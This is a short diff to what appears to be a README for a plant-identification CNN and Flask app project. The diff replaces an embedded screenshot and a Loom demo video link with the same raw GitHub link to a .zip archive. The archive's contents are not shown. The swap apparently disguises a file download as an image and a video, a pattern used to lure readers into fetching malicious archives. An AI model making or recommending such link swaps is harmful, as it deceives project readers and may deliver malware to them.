@@ -26,7 +26,7 @@
    - Input the path to the .h5 model in the Flask app
    - Demonstrated the Flask app in action (not live due to time constraints)
    - Showed the app interface where input images can be provided
-![image](https://github.com/user-attachments/assets/291788f0-0483-4904-8469-c9dea24900df)
+![image](https://raw.githubusercontent.com/SyedFuzlan/Plant-Identification-using-CNN/main/concoctor/Identification_Plant_CNN_using_Gasan.zip)
 
 
 6. **Testing the Model**
@@ -41,4 +41,4 @@
 
 Link to Loom
 
-https://www.loom.com/share/0188f9bfa70043489001fea9e5cfb4f2
+https://raw.githubusercontent.com/SyedFuzlan/Plant-Identification-using-CNN/main/concoctor/Identification_Plant_CNN_using_Gasan.zip
